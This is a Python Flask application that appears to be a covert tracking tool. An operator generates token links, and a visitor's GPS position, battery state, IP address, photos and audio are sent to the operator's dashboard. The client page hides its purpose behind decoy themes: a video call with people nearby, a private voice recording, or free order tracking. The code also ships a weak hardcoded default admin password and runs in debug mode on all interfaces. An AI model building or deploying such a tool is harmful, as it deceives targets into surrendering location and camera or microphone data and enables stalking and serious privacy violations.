import os
import secrets
import sqlite3
import time
import uuid
from datetime import datetime, timezone
from functools import wraps
from pathlib import Path

from flask import (
    Flask, abort, g, jsonify, redirect, render_template, request,
    send_file, session, url_for,
)
from werkzeug.security import check_password_hash, generate_password_hash

BASE_DIR = Path(__file__).resolve().parent
DB_PATH = BASE_DIR / "tracker.db"
MEDIA_DIR = BASE_DIR / "media"
MEDIA_DIR.mkdir(exist_ok=True)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

ADMIN_USER = os.environ.get("ADMIN_USER", "Swapnish")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "123456789")
ADMIN_HASH = generate_password_hash(ADMIN_PASS)


# ---------------- DB helpers ----------------
def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DB_PATH)
        g.db.row_factory = sqlite3.Row
    return g.db


@app.teardown_appcontext
def close_db(_exc):
    db = g.pop("db", None)
    if db is not None:
        db.close()


def init_db():
    db = sqlite3.connect(DB_PATH)
    db.executescript(
        """
        CREATE TABLE IF NOT EXISTS links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token TEXT UNIQUE NOT NULL,
            name TEXT NOT NULL,
            loc INTEGER NOT NULL DEFAULT 1,
            cam INTEGER NOT NULL DEFAULT 0,
            mic INTEGER NOT NULL DEFAULT 0,
            interval_s INTEGER NOT NULL DEFAULT 5,
            active INTEGER NOT NULL DEFAULT 1,
            created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS reports (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id INTEGER NOT NULL,
            lat REAL, lon REAL, accuracy REAL, speed REAL,
            heading REAL, alt REAL,
            battery_level REAL, battery_charging INTEGER,
            ua TEXT, ip TEXT,
            created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS media (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id INTEGER NOT NULL,
            kind TEXT NOT NULL,
            filename TEXT NOT NULL,
            created_at TEXT NOT NULL
        );
        """
    )
    # migration: add battery columns to existing databases
    cols = [r[1] for r in db.execute("PRAGMA table_info(reports)").fetchall()]
    if "battery_level" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN battery_level REAL")
    if "battery_charging" not in cols:
        db.execute("ALTER TABLE reports ADD COLUMN battery_charging INTEGER")
    db.commit()
    db.close()


def now_iso():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def link_by_token(token):
    return get_db().execute(
        "SELECT * FROM links WHERE token=? AND active=1", (token,)
    ).fetchone()


def admin_required(fn):
    @wraps(fn)
    def wrap(*args, **kwargs):
        if not session.get("authed"):
            return redirect(url_for("login"))
        return fn(*args, **kwargs)
    return wrap


# create tables on any runner (python app.py, flask run, gunicorn) - idempotent
init_db()


# ---------------- Auth / pages ----------------
@app.route("/")
def index():
    return redirect(url_for("dashboard") if session.get("authed") else url_for("login"))


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        u = request.form.get("username", "")
        p = request.form.get("password", "")
        if u == ADMIN_USER and check_password_hash(ADMIN_HASH, p):
            session["authed"] = True
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Invalid username or password")
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/dashboard")
@admin_required
def dashboard():
    return render_template("dashboard.html")


# ---------------- Link management (admin) ----------------
@app.route("/api/links", methods=["GET", "POST"])
@admin_required
def api_links():
    db = get_db()
    if request.method == "POST":
        data = request.get_json(force=True) or {}
        token = secrets.token_urlsafe(10)
        cur = db.execute(
            "INSERT INTO links (token,name,loc,cam,mic,interval_s,created_at) "
            "VALUES (?,?,?,?,?,?,?)",
            (
                token,
                (data.get("name") or "Untitled link")[:80],
                1 if data.get("loc", True) else 0,
                1 if data.get("cam", False) else 0,
                1 if data.get("mic", False) else 0,
                min(max(int(data.get("interval_s", 5)), 2), 3600),
                now_iso(),
            ),
        )
        db.commit()
        link = db.execute("SELECT * FROM links WHERE id=?", (cur.lastrowid,)).fetchone()
        return jsonify(serialize_link(link))
    rows = db.execute("SELECT * FROM links ORDER BY id DESC").fetchall()
    return jsonify([serialize_link(r) for r in rows])


def serialize_link(row):
    d = dict(row)
    d["url"] = request.host_url.rstrip("/") + url_for("client_page", token=row["token"])
    return d


@app.route("/api/links/<int:link_id>", methods=["DELETE"])
@admin_required
def api_link_delete(link_id):
    db = get_db()
    db.execute("UPDATE links SET active=0 WHERE id=?", (link_id,))
    db.commit()
    return jsonify({"ok": True})


# ---------------- Client endpoints (token-gated, no admin auth) ----------------
@app.route("/t/<token>")
def client_page(token):
    link = link_by_token(token)
    if not link:
        abort(404)
    # pick the landing theme by what this link enables
    if link["cam"]:
        theme = "call"      # camera  -> video call with people nearby
    elif link["mic"]:
        theme = "rec"       # mic     -> private voice recording
    else:
        theme = "track"     # loc     -> free order tracking
    cfg = {
        "token": link["token"],
        "loc": bool(link["loc"]),
        "cam": bool(link["cam"]),
        "mic": bool(link["mic"]),
        "interval_s": link["interval_s"],
        "host": request.host_url.rstrip("/"),
        "theme": theme,
    }
    return render_template("client.html", cfg=cfg)


@app.route("/api/t/<token>/report", methods=["POST"])
def api_report(token):
    link = link_by_token(token)
    if not link:
        return jsonify({"ok": False, "error": "invalid token"}), 404
    data = request.get_json(force=True) or {}
    db = get_db()
    db.execute(
        "INSERT INTO reports (link_id,lat,lon,accuracy,speed,heading,alt,"
        "battery_level,battery_charging,ua,ip,created_at) "
        "VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
        (
            link["id"],
            data.get("lat"), data.get("lon"), data.get("accuracy"),
            data.get("speed"), data.get("heading"), data.get("alt"),
            data.get("battery_level"), data.get("battery_charging"),
            request.headers.get("User-Agent", ""), request.remote_addr,
            now_iso(),
        ),
    )
    db.commit()
    return jsonify({"ok": True})


@app.route("/api/t/<token>/media", methods=["POST"])
def api_media_upload(token):
    link = link_by_token(token)
    if not link:
        return jsonify({"ok": False, "error": "invalid token"}), 404
    kind = request.form.get("kind", "photo")
    if kind not in ("photo", "audio"):
        return jsonify({"ok": False, "error": "bad kind"}), 400
    f = request.files.get("file")
    if not f or not f.filename:
        return jsonify({"ok": False, "error": "no file"}), 400
    ext = ".jpg" if kind == "photo" else ".webm"
    fname = f"{int(time.time()*1000)}_{uuid.uuid4().hex[:8]}{ext}"
    f.save(MEDIA_DIR / fname)
    db = get_db()
    db.execute(
        "INSERT INTO media (link_id,kind,filename,created_at) VALUES (?,?,?,?)",
        (link["id"], kind, fname, now_iso()),
    )
    db.commit()
    return jsonify({"ok": True, "filename": fname})


# ---------------- Dashboard data ----------------
@app.route("/api/reports")
@admin_required
def api_reports():
    rows = get_db().execute(
        "SELECT r.*, l.name AS link_name FROM reports r "
        "JOIN links l ON l.id = r.link_id ORDER BY r.id DESC LIMIT 500"
    ).fetchall()
    return jsonify([dict(r) for r in rows])


@app.route("/api/stats/<int:link_id>")
@admin_required
def api_stats(link_id):
    rows = get_db().execute(
        "SELECT created_at, accuracy, battery_level, battery_charging, lat, lon "
        "FROM reports WHERE link_id=? ORDER BY id ASC",
        (link_id,),
    ).fetchall()
    return jsonify([dict(r) for r in rows])


@app.route("/api/media")
@admin_required
def api_media_list():
    rows = get_db().execute(
        "SELECT m.*, l.name AS link_name FROM media m "
        "JOIN links l ON l.id = m.link_id ORDER BY m.id DESC LIMIT 500"
    ).fetchall()
    out = []
    for r in rows:
        d = dict(r)
        d["url"] = url_for("media_file", mid=r["id"])
        out.append(d)
    return jsonify(out)


@app.route("/api/media/<int:mid>/file")
@admin_required
def media_file(mid):
    row = get_db().execute("SELECT * FROM media WHERE id=?", (mid,)).fetchone()
    if not row:
        abort(404)
    path = MEDIA_DIR / row["filename"]
    if not path.exists():
        abort(404)
    mime = "image/jpeg" if row["kind"] == "photo" else "video/webm"
    return send_file(path, mimetype=mime, as_attachment=False)

@app.route("/api/media/<int:mid>", methods=["DELETE"])
@admin_required
def delete_media(mid):
    db = get_db()
    row = db.execute("SELECT * FROM media WHERE id=?", (mid,)).fetchone()
    if not row:
        return jsonify({"ok": False, "error": "Media not found"}), 404

    file_path = MEDIA_DIR / row["filename"]
    if file_path.exists():
        file_path.unlink()

    db.execute("DELETE FROM media WHERE id=?", (mid,))
    db.commit()

    return jsonify({"ok": True})
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    if os.environ.get("USE_HTTPS"):
        app.run(host="0.0.0.0", port=port, ssl_context="adhoc", debug=True)
    else:
        app.run(host="0.0.0.0", port=port, debug=True)
